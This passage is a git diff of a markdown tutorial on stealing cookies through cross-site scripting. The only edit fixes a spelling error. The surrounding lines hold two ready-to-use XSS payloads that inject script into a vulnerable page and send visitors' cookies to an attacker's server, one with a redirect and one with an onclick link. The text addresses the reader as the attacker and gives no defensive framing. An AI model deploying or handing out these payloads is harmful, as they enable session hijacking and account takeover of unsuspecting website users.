@@ -73,7 +73,7 @@ The next part of stealing cookies requires a bit more work.  First you'll need a
 ```HTML
 "><script language= "JavaScript">document.location="http://yourServerIpOrDomainName.com/nameOfYourPhpScript.php?cookie=" + document.cookie;document.location="http://www.pageYouWantToExploit.com"</script>
 ```
-This should log the cookie and then redirect the user back to the source page but if you notice this causes an infinit loop, you may need to modify it with an onclick event like this:
+This should log the cookie and then redirect the user back to the source page but if you notice this causes an infinite loop, you may need to modify it with an onclick event like this:
 ```HTML
 "><a href="#" onclick="document.location='http://yourServerIpOrDomainName.com/yourServerIpOrDomainName.php?cookie=' +escape(document.cookie);"><Click here if you are not automatically redirected></a></script>
 ```
